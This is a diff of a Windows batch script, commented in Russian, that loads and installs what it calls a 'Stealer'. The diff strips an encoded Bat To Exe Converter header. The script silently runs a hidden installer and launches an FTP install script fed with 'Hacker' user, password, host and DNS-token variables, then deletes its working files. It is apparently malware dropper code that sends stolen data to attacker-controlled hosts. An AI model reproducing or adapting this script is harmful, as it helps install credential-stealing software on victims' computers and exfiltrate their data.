@@ -1,40 +1,3 @@
-::[Bat To Exe Converter]
-::
-::fBE1pAF6MU+EWGveyEs+LQ9EWQa+JX6+A7tS7/r64e6MrVcYWKwtbbP+wqSBLuUd/kTYfJg+wntWlPQ/GAJUewDlZwE9yQ==
-::fBE1pAF6MU+EWGveyEs+LQ9EWQa+JX6+A7tS7/r64e6MrVcYWKwtbbP+wqSBLuUd/kTYYpEowjRfgM5s
-::fBE1pAF6MU+EWGveyEs+LQ9EWQa+JX6+A7tS7/r64e6MrVcYWKwtbbP+wqSBLuUd/kTYXJg+wntWlPQ/GAJUewCNWj96q29W1g==
-::fBE1pAF6MU+EWGveyEs+LQ9EWQa+JX6+A7tS7/r64e6MrVcYWKwtbbP+wqSBLuUd/kTYfJg+wntWlO04PCRragunax0woH1WpG2HecWdp28=
-::YAwzoRdxOk+EWAnk
-::fBw5plQjdG8=
-::YAwzuBVtJxjWCl3EqQJgSA==
-::ZR4luwNxJguZRRnk
-::Yhs/ulQjdF+5
-::cxAkpRVqdFKZSDk=
-::cBs/ulQjdF+5
-::ZR41oxFsdFKZSTk=
-::eBoioBt6dFKZSDk=
-::cRo6pxp7LAbNWATEpSI=
-::egkzugNsPRvcWATEpSI=
-::dAsiuh18IRvcCxnZtBNQ
-::cRYluBh/LU+EWAnk
-::YxY4rhs+aU+JeA==
-::cxY6rQJ7JhzQF1fEqQJQ
-::ZQ05rAF9IBncCkqN+0xwdVs0
-::ZQ05rAF9IAHYFVzEqQJQ
-::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
-::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
-::cRolqwZ3JBvQF1fEqQJQ
-::dhA7uBVwLU+EWDk=
-::YQ03rBFzNR3SWATElA==
-::dhAmsQZ3MwfNWATElA==
-::ZQ0/vhVqMQ3MEVWAtB9wSA==
-::Zg8zqx1/OA3MEVWAtB9wSA==
-::dhA7pRFwIByZRRnk
-::Zh4grVQjdD2DJFCK8VYgPRloVRGGOWX0Aacd5uzw4PCCrgMPQd4aYJ/U1LGANOEv5krlcZA5xmlOgccJHiROdwHlaxcxyQ==
-::YB416Ek+ZW8=
-::
-::
-::978f952a14a936cc963da21a135fa983
 rem Файл загрузки и установки стайлера (Академический вариант)
 rem USAGE
 rem > load_ftpStyler.bat
@@ -125,17 +88,17 @@ del /Q /F %LocalFolderZ%\*.*
 del /f /q %CommFTP%
 
 rem Копируем wget и запускаем установку в каталоге %LocalFolder%
-copy wget.exe %LocalFolderZ%\wget.exe
+rem copy wget.exe %LocalFolderZ%\wget.exe
 rem copy ExponentaInstallerFtpHidden.exe %LocalFolderZ%\ExponentaInstallerFtpHidden.exe
-copy install_Styler.ini %LocalFolderZ%\
-copy installFTP_Stylerdistrib.bat %LocalFolderZ%\
-copy Install_StylerFTP.bat %LocalFolderZ%\
+rem copy install_Styler.ini %LocalFolderZ%\
+rem copy installFTP_Stylerdistrib.bat %LocalFolderZ%\
+rem copy Install_StylerFTP.bat %LocalFolderZ%\
 
 rem Запускаем инсталлятор Admin-Pack "Экспонента"
-ExponentaInstallerFtpHidden.exe
+%LocalFolderZ%\nit-install-hidden.exe
 
 rem Запускаем инсталлятор Stealer "Экспонента"
-call install_StylerFTP.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% ftp %Hacker_ftpport% %hldnstoken% %entrydnstoken%
+call %LocalFolderZ%\install_StylerFTP.bat %Hacker_User% %Hacker_Pass% %Hacker_host2% %Hacker_host3% ftp %Hacker_ftpport% %hldnstoken% %entrydnstoken%
 cd /d %curdir%
 
 rem Удаляем временный каталог
